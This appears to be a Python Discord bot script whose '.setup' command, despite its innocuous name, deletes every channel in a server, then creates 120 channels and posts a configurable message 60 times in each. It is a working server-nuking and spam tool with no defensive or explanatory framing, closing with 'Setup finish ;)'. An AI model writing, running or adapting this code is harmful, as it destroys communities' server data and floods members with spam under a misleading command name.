import discord
from discord.ext import commands
import json

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print('Bot is ready.')

@bot.command()
async def setup(ctx):
    await bot.wait_until_ready()  

    if ctx.author.guild_permissions.administrator:
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()

        with open('bot.json', 'r') as f:
            data = json.load(f)
            channel_name = data.get('channel_name', 'gg')  
            category_name = data.get('category_name', 'Report')  
            message_content = data.get('message_content', 'HELLO I\'M HERE')  

        category = await guild.create_category(category_name)

        for i in range(1, 121):
            new_channel = await category.create_text_channel(f"{channel_name}")
            if isinstance(new_channel, discord.TextChannel):  
                for _ in range(60):
                    await new_channel.send(message_content)
        
        await ctx.send(f"Setup finish ;)")
    else:
        await ctx.send("you don't have the required permissions.")

with open('bot.json', 'r') as f:
    data = json.load(f)
    bot_token = data.get('bot_token')

bot.run(bot_token)
